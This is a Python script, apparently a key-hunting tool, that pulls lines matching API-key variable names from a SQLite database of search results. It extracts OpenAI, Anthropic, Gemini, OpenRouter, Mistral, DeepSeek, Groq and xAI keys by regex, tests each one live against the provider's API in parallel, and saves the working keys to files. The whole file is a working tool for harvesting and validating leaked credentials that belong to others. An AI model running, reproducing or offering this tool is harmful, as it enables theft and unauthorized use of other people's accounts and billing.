import sqlite3
import requests
import re
import concurrent.futures
import threading
from typing import List, Set, Dict, Any, Tuple

DB_PATH = "4_api_keys.db"

# Provider Configurations
PROVIDER_CONFIGS: Dict[str, Dict[str, Any]] = {
    "openai": {
        "queries": ["%OPENAI_API_KEY%", "%OPENAI_KEY%", "%OPENAI_SECRET_KEY%", "%OPENAI_TOKEN%"],
        "prefixes": ["sk-", "sk-proj-"],
        "patterns": [r'(sk-proj-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20})', r'(sk-[A-Za-z0-9]{48})'],
        "validation_url": "https://api.openai.com/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_openai_keys.txt",
    },
    "anthropic": {
        "queries": ["%ANTHROPIC_API_KEY%", "%CLAUDE_API_KEY%", "%ANTHROPIC_KEY%"],
        "prefixes": ["sk-ant-", "sk-ant-api03-", "apikey_"],
        "patterns": [r'(sk-ant-api03-[A-Za-z0-9\-_]{95})', r'(sk-ant-[A-Za-z0-9\-_]{44})'],
        "validation_url": "https://api.anthropic.com/v1/organizations",  # Changed to free endpoint
        "auth_method": "x-api-key",
        "is_post": False,  # Changed to GET
        "post_data": {},  # Not needed
        "output_file": "valid_anthropic_keys.txt",
    },
    "google": {
        "queries": ["%GOOGLE_API_KEY%", "%GEMINI_API_KEY%", "%GEMINI_KEY%"],
        "prefixes": ["AIzaSy"],
        "patterns": [r'(AIzaSy[A-Za-z0-9\-_]{33})'],
        "validation_url": "https://generativelanguage.googleapis.com/v1beta/models",
        "auth_method": "key_param",
        "output_file": "valid_gemini_keys.txt",
    },
    "openrouter": {
        "queries": ["%OPENROUTER_API_KEY%", "%OPEN_ROUTER_API_KEY%"],
        "prefixes": ["sk-or-v1-"],
        "patterns": [r'(sk-or-v1-[a-f0-9]{64})'],
        "validation_url": "https://openrouter.ai/api/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_openrouter_keys.txt",
    },
    "mistral": {
        "queries": ["%MISTRAL_API_KEY%", "%MISTRAL_KEY%"],
        "prefixes": [],  # No fixed prefix, skip matched_line filter
        "patterns": [r'([A-Za-z0-9]{32})'],  # Generic pattern, might have false positives
        "validation_url": "https://api.mistral.ai/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_mistral_keys.txt",
    },
    "deepseek": {
        "queries": ["%DEEPSEEK_API_KEY%", "%DEEPSEEK_KEY%"],
        "prefixes": ["sk-"],
        "patterns": [r'(sk-[a-f0-9]{32})'],
        "validation_url": "https://api.deepseek.com/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_deepseek_keys.txt",
    },
    "groq": {
        "queries": ["%GROQ_API_KEY%", "%GROQ_KEY%"],
        "prefixes": ["gsk_"],
        "patterns": [r'(gsk_[A-Za-z0-9]{48})'],
        "validation_url": "https://api.groq.com/openai/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_groq_keys.txt",
    },
    "xai": {
        "queries": ["%XAI_API_KEY%", "%XAI_KEY%"],
        "prefixes": ["xai-"],
        "patterns": [r'(xai-[A-Za-z0-9]{64})'],
        "validation_url": "https://api.x.ai/v1/models",
        "auth_method": "bearer",
        "output_file": "valid_xai_keys.txt",
    },
}


# Global progress tracking
progress_lock = threading.Lock()
provider_progress: Dict[str, Dict[str, Any]] = {}  # provider -> {"checked": int, "total": int, "valid": List[str]}


# Generic Functions
def get_candidates_from_db(queries: List[str], prefixes: List[str]) -> List[str]:
    """Retrieves potential API key candidates from the database based on queries and prefixes."""
    candidates = []
    if not queries or (not prefixes and prefixes != []):  # Allow empty prefixes for some providers
        return candidates
    try:
        with sqlite3.connect(DB_PATH) as con:
            cur = con.cursor()
            query_conditions = []
            params = []
            
            if queries:
                query_conditions.append("(" + " OR ".join(["search_query LIKE ?"] * len(queries)) + ")")
                params.extend(queries)
            
            if prefixes:
                query_conditions.append("(" + " OR ".join(["matched_line LIKE ?"] * len(prefixes)) + ")")
                like_patterns = [f"%{prefix}%" for prefix in prefixes]
                params.extend(like_patterns)
            
            sql_query = "SELECT matched_line FROM results WHERE " + " AND ".join(query_conditions)  # nosec [B608]
            cur.execute(sql_query, params)
            rows = cur.fetchall()
            candidates = [row[0] for row in rows if row[0]]
    except sqlite3.OperationalError as e:
        print(f"Error connecting to or reading from database: {e}")
        print(f"Please ensure the database '{DB_PATH}' exists and is not corrupted.")
    return candidates


def extract_api_keys(line: str, patterns: List[str]) -> List[str]:
    """Extracts API keys from a line of text using a list of regex patterns."""
    found_keys = []
    for pattern in patterns:
        matches = re.findall(pattern, line)
        if matches:
            found_keys.extend(matches)
    return found_keys


def is_key_valid(api_key: str, config: Dict[str, Any], provider: str = "") -> bool:
    """Validates an API key by making a request to the provider's API."""
    url = config["validation_url"]
    auth_method = config["auth_method"]
    headers = {"User-Agent": "api-key-hunt/1.0"}
    params = {}
    is_post = config.get("is_post", False)
    post_data = config.get("post_data", {})

    if auth_method == "bearer":
        headers["Authorization"] = f"Bearer {api_key}"
    elif auth_method == "x-api-key":
        headers["x-api-key"] = api_key
        if "anthropic" in url: # Specific header for Anthropic
            headers["anthropic-version"] = "2023-06-01"
    elif auth_method == "key_param":
        params["key"] = api_key

    try:
        if is_post:
            response = requests.post(url, headers=headers, json=post_data, params=params, timeout=10)
        else:
            response = requests.get(url, headers=headers, params=params, timeout=10)
        
        # Debug: print status for non-200 responses
        if response.status_code != 200 and not (is_post and response.status_code == 400):
            print(f"DEBUG {provider}: status {response.status_code} for {api_key[:10]}...")
        
        # For Anthropic, 400 on POST endpoint means valid key (bad request due to empty data)
        if is_post and response.status_code == 400:
            return True

        if response.status_code == 200:
            return True
        return False
    except requests.RequestException as e:
        print(f"DEBUG {provider}: exception {e} for {api_key[:10]}...")
        return False


def update_progress(provider: str, is_valid: bool, key: str):
    """Updates progress for a provider and prints the global progress line."""
    with progress_lock:
        if is_valid:
            provider_progress[provider]["valid"].append(key)
        provider_progress[provider]["checked"] += 1
        
        # Build progress line
        progress_parts = []
        for prov, data in provider_progress.items():
            checked = data["checked"]
            total = data["total"]
            progress_parts.append(f"{prov.upper()}: {checked}/{total}")
        
        progress_line = " | ".join(progress_parts)
        print(f"\r{progress_line}", end='', flush=True)


def validate_key_with_provider(key: str, provider: str, config: Dict[str, Any]) -> Tuple[str, bool, str]:
    """Validates a single key and returns (provider, is_valid, key)."""
    is_valid = is_key_valid(key, config, provider)
    return (provider, is_valid, key)


def main():
    """Main function: parallel DB queries, then parallel key validation with shared progress."""
    print("Starting parallel database queries for all providers...")
    
    # Step 1: Parallel DB queries to get candidates
    all_keys_by_provider: Dict[str, List[str]] = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=len(PROVIDER_CONFIGS)) as db_executor:
        future_to_provider = {}
        for name, config in PROVIDER_CONFIGS.items():
            future = db_executor.submit(get_candidates_from_db, config["queries"], config["prefixes"])
            future_to_provider[future] = name
        
        for future in concurrent.futures.as_completed(future_to_provider):
            provider = future_to_provider[future]
            try:
                candidates = future.result()
                print(f"DEBUG: {provider.upper()} - Found {len(candidates)} candidate lines")
                
                # Extract keys
                extracted_keys: Set[str] = set()
                for line in candidates:
                    keys = extract_api_keys(line, PROVIDER_CONFIGS[provider]["patterns"])
                    extracted_keys.update(keys)
                
                all_keys_by_provider[provider] = sorted(list(extracted_keys))
                provider_progress[provider] = {"checked": 0, "total": len(all_keys_by_provider[provider]), "valid": []}
                
            except Exception as exc:
                print(f"DB query for {provider.upper()} failed: {exc}")
    
    # Step 2: Collect all keys with provider labels
    all_tasks = []
    for provider, keys in all_keys_by_provider.items():
        for key in keys:
            all_tasks.append((key, provider, PROVIDER_CONFIGS[provider]))
    
    total_keys = len(all_tasks)
    print(f"\nCollected {total_keys} keys across all providers. Starting parallel validation...")
    
    # Step 3: Parallel validation with shared progress
    with concurrent.futures.ThreadPoolExecutor(max_workers=20) as val_executor:  # More workers for efficiency
        future_to_task = {val_executor.submit(validate_key_with_provider, key, provider, config): (key, provider) 
                         for key, provider, config in all_tasks}
        
        for future in concurrent.futures.as_completed(future_to_task):
            key, provider = future_to_task[future]
            try:
                prov, is_valid, k = future.result()
                update_progress(prov, is_valid, k)
            except Exception as exc:
                print(f"\nError validating key {key[:10]}...: {exc}")
    
    print("\n\nValidation complete. Saving results...")
    
    # Step 4: Save results per provider
    for provider, data in provider_progress.items():
        valid_keys = data["valid"]
        output_file = PROVIDER_CONFIGS[provider]["output_file"]
        if valid_keys:
            print(f"{provider.upper()}: Found {len(valid_keys)} valid keys -> {output_file}")
            with open(output_file, 'w') as f:
                for key in sorted(valid_keys):
                    f.write(key + '\n')
        else:
            print(f"{provider.upper()}: No valid keys found.")
    
    print("All done.")


if __name__ == "__main__":
    main()
